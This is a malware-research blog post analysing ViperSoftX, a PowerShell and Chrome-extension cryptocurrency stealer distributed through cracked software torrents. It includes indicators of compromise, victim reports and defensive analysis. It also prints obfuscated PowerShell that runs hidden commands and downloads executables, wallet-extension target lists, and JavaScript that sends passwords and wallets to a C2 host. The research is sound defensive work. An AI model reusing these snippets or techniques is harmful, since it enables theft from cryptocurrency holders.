---
layout: default
title: ViperSoftx Expanded - Torrents lead to JavaScript-based Cryptocurrency Stealers
categories: [Malware Research, InfoStealers]
tags: [Malware, CTI]
comments: false
---
<meta name="twitter:image" content="https://github.com/colincowie/colincowie.github.io/raw/master/assets/img/ViperSoftX/banner.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title"  content="ViperSoftx Expanded">
<meta name="twitter:description" content="Torrents lead to JavaScript-based Cryptocurrency Stealers">

#  ViperSoftx Expanded - Torrents lead to JavaScript-based Cryptocurrency Stealers

Table of Contents:
- **[Prior Research](#Background)**
- **[PowerShell Analysis and Pivoting](#PowerShell)**
- **[Malware Distribution](#Distribution)**
- **[Browser Extension Analysis](#extensions)**
- **[Indicators of Compromise](#iocs)**

## Prior Research & Background Info

<a name="Background"></a>
In Feburary of 2020 [@c3rb3ru5d3d53c shared details](https://twitter.com/c3rb3ru5d3d53c/status/1227071037633945600) about a new obfuscated variant of vjw0rm that she referred to as **ViperSoftX**

Shortly afterwards FortiGuard Labs [published research](https://www.fortinet.com/blog/threat-research/vipersoftx-new-javascript-threat) that describes ViperSoftX as a:
> *"JavaScript based Remote Access Trojan (RAT) and cryptocurrency stealer, which we have dubbed “ViperSoftX” (due to a hardcoded string used by its creator), became notably active towards the end of 2019"*

In April of 2021 [John Hammond analyzed](https://www.youtube.com/watch?v=k-nFdF5FEwA&t=2564s) a ViperSoftX sample that was notably responsible for stealing  ~2 million USD worth of Bitcoin.

The previous research from @c3rb3ru5d3d53c and Fortinet do a great job of documenting ViperSoftX's core functionality and persistency techniques.

![Fortinet_Analysis](/assets/img/ViperSoftX/fortinet.PNG)

*Image credit: Fortinet*

This new blog post focuses on recent ViperSoftX activity, its distribution techniques as well as how ViperSoftX now leverages Chrome extension malware in there efforts to steal cryptocurrency.

## Recent Threat Actor Activity

My investigation into recent ViperSoftx activity started when a friend reached out to me about a [github gist](https://gist.github.com/infernoboy/cf114fda56ff3706478e0d1e6a1a1b27) created 2 months ago titled *danger.ps1* with the following context:
> "This script was found in a malicious file not being detected by any AV as reported by virustotal"

This powershell script uses the command and control server **api.private-chatting[.]com/connect**, which very structurally similar to the C2 URL John Hammond observed in his previous analysis - **api.backend-app[.]com/connect**.

![youtube](/assets/img/ViperSoftX/youtube.png)

### PowerShell Analysis and Pivoting

<a name="PowerShell"></a>

The following obfuscated PowerShell code from *danger.ps1* references functions observed in previous ViperSoftX research such as *Cmd*, *DwnlExe* and  *SelfRemove*
```
try {
    [string]$kk9XDcoU8Sfo692 = oUjmVhxHJ4Qhrw;
    [string[]] $sep = $ZFKUuv2t12Af;
    $Fd1Jal88zKyxij = $kk9XDcoU8Sfo692.Split( $sep, [StringSplitOptions]::None);
    $ivI0sA6txn5XPifq = $Fd1Jal88zKyxij[0];
    $JkByjqH1xztsW2YUG = $Fd1Jal88zKyxij[1];

    if ($ivI0sA6txn5XPifq -eq "Cmd") {
        Start-Process -FilePath "cmd.exe" -WindowStyle "Hidden" -ArgumentList ("/c " + $JkByjqH1xztsW2YUG)
    }
    if ($ivI0sA6txn5XPifq -eq "DwnlExe") {
        $path = $AuVAfc591z0Yw + $Fd1Jal88zKyxij[2];
        $cmd = $Fd1Jal88zKyxij[3] + $path;
        yQM1ybBDSjEP $Fd1Jal88zKyxij[1] $path $true;
        Start-Sleep 1
        Start-Process -FilePath "cmd.exe" -WindowStyle "Hidden" -ArgumentList ("/c " + $cmd)
    }
    if ($ivI0sA6txn5XPifq -eq "SelfRemove") {
        Gn4bSDMHKIxEE8UP7wZJ $true
    }
}
catch {}
```

Looking at the powershell script *danger.ps1*, there were a few function names of interest to me:
- *DownloadFile*
- *FindPaths*
- *FindWindow*
- *Get-Clip*
- *Get-HWID*
- *Handle_WM_CLIPBOARDUPDATE*
- *Set-Clip*
- *Set-Log*
- *av_enabled*
- *getUserAgent*


The function *FindWindow* checks the victims running Windows applications for the following application titles:
```
$keywords = @('binance', 'coinbase', 'blockchain', 'voyager', 'blockfi', 'coindesk', 'etoro', 'kucoin', 'citi', 'paxful', 'paypal', 'huobi', 'poloniex', 'bittrex', 'kraken', 'bitfinex', 'bitstamp')
```
One of the powershell malicious functionality is to hijack the victims copy and paste clipboard values for the following cryptocurrencies: BTC, BCH, BNB, ETH, XMR, XRP, DOGE & DASH

ViperSoftX checks to see if the victim has any of the targeted cryptocurrency browser extensions installed

Chrome Extension Targets:
```
"targets": [
    {
        "name": "Metamask-C",
        "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
    },
    {
        "name": "MEWcx-C",
        "path": "nlbmnnijcnlegkjjpcfjclmcfggfefdm"
    },
    {
        "name": "Coin98-C",
        "path": "aeachknmefphepccionboohckonoeemg"
    },
    {
        "name": "Binance-C",
        "path": "fhbohimaelbohpjbbldcngcnapndodjp"
    },
    {
        "name": "Jaxx-C",
        "path": "cjelfplplebdjjenllpjcblmjkfcffne"
    },
    {
        "name": "Coinbase-C",
        "path": "hnfanknocfeofbddgcijnmhnfnkdnaad"
    }
]
```  

Edge Browser Extensions Targets:
```
"targets": [
    {
        "name": "Metamask-E",
        "path": "ejbalbakoplchlghecdalmeeeajnimhm"
    }
]
```

Brave Browser Extensions Targets:
```
"targets": [
    {
        "name": "Metamask-B",
        "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
    },
    {
        "name": "MEWcx-B",
        "path": "nlbmnnijcnlegkjjpcfjclmcfggfefdm"
    },
    {
        "name": "Coin98-B",
        "path": "aeachknmefphepccionboohckonoeemg"
    },
    {
        "name": "Binance-B",
        "path": "fhbohimaelbohpjbbldcngcnapndodjp"
    },
    {
        "name": "Jaxx-B",
        "path": "cjelfplplebdjjenllpjcblmjkfcffne"
    },
    {
        "name": "Coinbase-B",
        "path": "hnfanknocfeofbddgcijnmhnfnkdnaad"
    }
]
```

The function *FindPaths* uses a unique technique to identify if the victim user has a MetaMask cryptocurrency FireFox extension installed
```
try {
    $ba = Get-ChildItem -Path "$env:appdata\Mozilla\Firefox\Profiles\*.xpi" -Recurse -Force;
    Foreach ($i in $ba) {
        if ($i.Name -match "ebextension@metamask.io.xpi") {
            try {
                [string] $ss = "metamask-F"
                $results.Add($ss)

            }
            catch {
                Write-Host "error"
            }
        }
    }
}
catch {}
```

I leveraged VirusTotal to [query](https://www.virustotal.com/gui/search/content%253A%257B24%252065%25206e%252076%25203a%252061%252070%252070%252064%252061%252074%252061%25205c%25204d%25206f%25207a%252069%25206c%25206c%252061%25205c%252046%252069%252072%252065%252066%25206f%252078%25205c%252050%252072%25206f%252066%252069%25206c%252065%252073%25205c%25202a%25202e%252078%252070%252069%257D/files) for recent file submissions referencing *"$env:appdata\Mozilla\Firefox\Profiles\*.xpi"*.
There were multiple PowerShell scripts with 0 AV detections on VirusTotal at the time.
![VT](/assets/img/ViperSoftX/VT.PNG)

Further review of these files resulted in the discovery of additional threat actor infrastructure:
- **wmail-service[.]com**

**Malware Distribution**

<a name="Distribution"></a>

 While researching **api.backend-app[.]com** I identified a related forum thread posted 2 months after John Hammond's video. In summer of 2021 the user *shameera* posted a torrent for a cracked copy of PhotoShop. Multiple users reported it that the torrent lead to malware that involving **api.backend-app[.]com/connect**.

![forum](/assets/img/ViperSoftX/forum_post.png)
*Forum Posting*

![forum](/assets/img/ViperSoftX/forum_post2.png)
*Forum Reply*

There were a few submissions on bitcoinabuse.com for ViperSoftX's cryptocurrency wallet addresses where victims explained that they tried installing cracked software and ended up losing some cryptocurrency.

[*Apr 21, 2022*](https://www.bitcoinabuse.com/reports/1Pqkb4MZwKzgSNkaX32wMwg95D9NfW9vZX)
> *"I downloaded an alleged crack of software called Passper for PDF from The Pirate Bay, which was uploaded by user called MotasemBT. https://thepiratebay.party/torrent/57638901/Passper_for_PDF_3.6.2.3_Multilingual___crack Inside is crack.zip, which contains a malicious file called Activator.exe. I ran the program, clicked PATCH, which appeared to do nothing. I gave up and moved on to other tasks. The next day (today) I pasted a BTC address that I immediately recognized as NOT the one I copied. I opened my clipboard manager, and sure enough, a hidden Powershell process replaced the address I copied, hoping I wouldn't see the difference. This has happened before; I lost $500 in crypto from an attempted transfer because I didn't notice the address difference when I pasted. This time I caught it right away. You can find exactly what the malicious program does and how to undo the damage here: https://gist.github.com/infernoboy/cf114fda56ff3706478e0d1e6a1a1b27?permalink_comment_id=4140687#gistcomment-4140687 1. A task was created under Microsoft > Windows > NetService > Network that is spawning PowerShell. You can safely delete the entire NetService folder, as it was also created by the malware. 2. Delete a fake log file that it created where it hides the script: C:\Windows\logs\system-logs.txt 3. It also replaces the contents of C:\Windows\System32\SyncAppvPublishingServer.vbs with its own version. A copy from a clean install of Windows 11 (works for Windows 10 as well) can be found here: https://gist.github.com/infernoboy/7cc1fe26e647dd08e6e63a201cb38e27"*

[*May 15, 2022*](https://www.bitcoinabuse.com/reports/bc1qn6ype8u5kgj672mvsez9wz9wt9wk22tzd5vprp)
> *"Downloaded flstudio from 1337x, installed and then task appeared in task scheduler which malwarebytes detected. That task ran daily and created a fake log file which had a huge ass base64 string which turned out be a script which contains unknown websites and references to crypto (INCLUDING THIS ADDRESS) at the bottom, not sure if miner or ransomware."*

[*May 24, 2022*](https://www.bitcoinabuse.com/reports/1Pqkb4MZwKzgSNkaX32wMwg95D9NfW9vZX)
> *"I have downloaded a file from: https://getintopc.com/softwares/image-viewer/coolutils-total-image-converter-2022-free-download/ Total image converter with crack/activator. I have used the activator and nothing happened. The program worked just fine, I could convert images without a watermark or anything. But recently when I have copy-pasted my Binance BTC address to receive payment from a friend, I found the money was not reached to my Binance account. Then I talked with Binance support and they told me about this Copy-Paste ransomware/malware that changes the copied BTC address tho their's BTC address silently. If you do not check and reconfirm your BTC address then the sender will send the money to the creator of this ransomware. So always check and re-check and confirm your Crypto address when you send it to someone. I have lost 250$."*

**Chrome Extension Analysis**

<a name="extensions"></a>

The ViperSoftx command and control servers are currently hosting malicious browser extensions
- counter.wmail-service[.]com/api/file/download/v3.zip
- api.private-chatting[.]com/api/file/download/v3.zip

 I leveraged the open source tool ExtAnalysis to review *v3.zip* and confirmed this was a chrome extension named **Update Manager**. Manual review of the extension source code helped me identify functionality. [*Note: I previously wrote about analyzing chrome extension with ExtAnalysis*](https://www.th3protocol.com/2020/Chrome-Extension-Analysis)

 ![ExtAnalysis](/assets/img/ViperSoftX/ext_analysis.PNG)

JavaScript Files Leveraged:
- *webpack_common.js*
  - Generic CryptoJacker
- *webpack_content.js*
  - Malicious supporting file
- *webpack_kuc.js*
  - Targets kucoin
- *webpack_cb.js*
  - Targets coinbase
- *webpack_bnb.js*
  - Targets binance
- *webpack_block.js*
  - Targets blockchain.com
- *webpack_gt.js*
  - Targets gate.io

Using Python3 with selenium, I wrote a quick script that loads the malicious extension into a chrome browser with all network traffic proxied.

```
import time
from selenium import webdriver

options = webdriver.ChromeOptions()
options.add_argument('load-extension=C:\Users\demo\Downloads\v3_extracted')
options.add_argument('--proxy-server=127.0.0.1:8080')
options.add_argument('--allow-running-insecure-content')
options.add_argument('--ignore-certificate-errors')
driver = webdriver.Chrome(options=options)
driver.get("chrome://extensions/")

time.sleep(10000)
```

By visiting various websites and interacting with the developer console I was able to confirm that malicious JavaScript was being injected into every webpage visited.

![ExtAnalysi](/assets/img/ViperSoftX/binance.PNG)

After studying the JavaScript injected I used the chrome developer tools to interact with the browser extension JavaScript runtime and extract the CryptoJacker configuration.

![Config](/assets/img/ViperSoftX/config.png)

During my analysis I identified a command and control URL leveraged during the actions on objective stage of the infection:
```
function _0xd8afac(_0x33828d, _0x3eb13c) {
     const _0x593a1e = _0x285dc9;
     let _0x2ceb5e = _0x593a1e(0x1eb);
     _0x2ceb5e += '\x0d\x0a',
     _0x2ceb5e += '\x0d\x0a',
     _0x2ceb5e += btoa(JSON['stringify']({
         'password': _0x33828d,
         'wallet': _0x3eb13c
     }));
     const _0x5a5263 = {
         'uri': 'https://st' + _0x593a1e(0x1e2) + '0.com/uplo' + _0x593a1e(0x1f2),
         'options': {
             'method': _0x593a1e(0x1f8),
             'mode': 'cors',
             'credentials': _0x593a1e(0x1d2),
             'body': _0x2ceb5e
         }
     };
     if (_0x55fc79)
         console[_0x593a1e(0x1dd)](_0x5a5263);
     window[_0x593a1e(0x1df) + _0x593a1e(0x1dc)](new MessageEvent('b8b0becb-0' + _0x593a1e(0x207) + '688-e3671f' + _0x593a1e(0x1c7),{
         'data': _0x5a5263
     }));
 }
```
*Note: This is a partial code snippet*

Although this JavaScript is heavily obfuscated I was able to use the chrome JavaScript runtime to determine the exfiltration command and control value:
- staticassets0[.]com/upload.php

![c2](/assets/img/ViperSoftX/c2.PNG)

![c2](/assets/img/ViperSoftX/c2_server.PNG)

## Indicators of Compromise

<a name="iocs"></a>
**Previous C2 Domains**

- seko.vipers[.]pw
- ai.backend-app[.]com

**Recent C2 URLs**

- ai.backend-chat[.]com/connect
- api.private-chatting[.]com/connect
- api.private-chatting[.]com/api/file/download/inj.ps1
- counter.wmail-service[.]com/api/file/download/inj.ps1
- worldchat-room[.]com/api/file/download/inj.ps1
- counter.wmail-service[.]com/api/file/download/v3.zip
- api.private-chatting[.]com/api/file/download/v3.zip
- staticassets0[.]com/upload.php

**Chrome Extensions**
- 75dab973fb58cb1f32e78b8622f61f7eb0048156

**VirusTotal Submissions**

- Date Uploaded to VT: 2022-02-26 02:00:22 UTC
  - SHA1: 6282467b6851d906f715cfb0849189cfdc9b3bf5
  - VirusTotal Upload Name: test2.ps1

- Date Uploaded to VT: 2022-03-11 13:25:31 UTC
  - SHA1: ab5aee1a511ecdad26276cc27d427e743b5b2f48
  - VirusTotal Upload Name: unobfuscated-PS

- Date Uploaded to VT: 2022-04-10 07:38:04 UTC
  - SHA1: fe99dea8887f44e8941be30f825b18c42647fd8b
  - VirusTotal Upload Name: a.txt

- Date Uploaded to VT: 2022-05-02 14:34:30 UTC
  - SHA1: 6fab33e51f46d7a04db05c8eb9e2a69b8e07eb54
  - VirusTotal Upload Name: base64 dekokdet til utf fra gjemt skript.txt

- Date Uploaded to VT: 2022-05-19 21:36:00 UTC
  - SHA1: 974df2090316d62d339f2f84fcfc338145645a81
  - VirusTotal Upload Name: $SuspiciousScript.ps1

- Date Uploaded to VT: 2022-05-22 17:25:45 UTC
  - SHA1: 73610b4e869a5172c72fce288c17ee29ac466f8b
  - VirusTotal Upload Name: danger.ps1


**Threat Actor CryptoCurrency Wallets**
- bc1qn6ype8u5kgj672mvsez9wz9wt9wk22tzd5vprp
- 1Pqkb4MZwKzgSNkaX32wMwg95D9NfW9vZX
- 19Wx3baZgyXrLZkUhLDmigkwacFAVBmbkp
- 3PdX73yYSwp7TWWzKKAkB36ttPeKEBk8MY
- bc1q23l2e2n22ccfcmssmjm5f5ew6xvsnsvva4zsu6
- bc1q23l2e2n22ccfcmssmjm5f5ew6xvsnsvva4zsu6
- qqkyavklha3qrnazv7hqq6q6mtv89ktj6g72cz738l
- qqkyavklha3qrnazv7hqq6q6mtv89ktj6g72cz738l
- 0xf4b10f8D6F2659C0Eb2c2F559F62Fd90f0E853d6
- bnb1kf28637nu0az5ej2fd4f8g7srl08st5g77y33y
- 41un7RNnZJBSwX6kfGzA9FiPeu9WT9vCpHryQ8phJCVB8cWNviw5RWH4GE6ruVdKwp1MuwGioZDvSQZhnBnnTfigUUsQd4K
- XdxTmTFuHrcHnQQhfweAnHtExFB5BXmU1z
- DUUNTm23sVwLyiw27WW9ZPT9XfiWhB1Cvf
- rLGYqDiDbQNhztLHStwWTt7FYN7HtedZYJ
- TNtPzCb9Szfw76gkicd6X8ydXLNaVxfFWh
- kava1emxzwjw84e0re7awgue9kp4gseesyqrttg69sm
- cosmos1mcah8lel6rxhlqsyrzpm8237cqcuzgyw70nm6f
- tz1g6rcQAgtdZc8PNUaTUzrDD8PYuCeVj4mb
- t1XjiZx8EydDDRuLisoYyVifcSFb96a3YBj
- addr1q9c27w7u4uh55sfp64ahtrnj44jkthpe7vyqgcpt73z9lrq7fw3juld8k2ksz2p82tv45j8yc5wzqmr4ladxyt0vjxrsf33mjk
- zil1aw3kyrymt52pq2e4xwzusdfce9e5tmewvshdrm
- He4V4i2t5dAqJZEnvrzSH1236wyHKwGrK96iCUyrmg3D
- 122zNSYNN2TSR2H5wBCX16Yyvq7qLFWo1d6Lvw2t9CNxMxt1
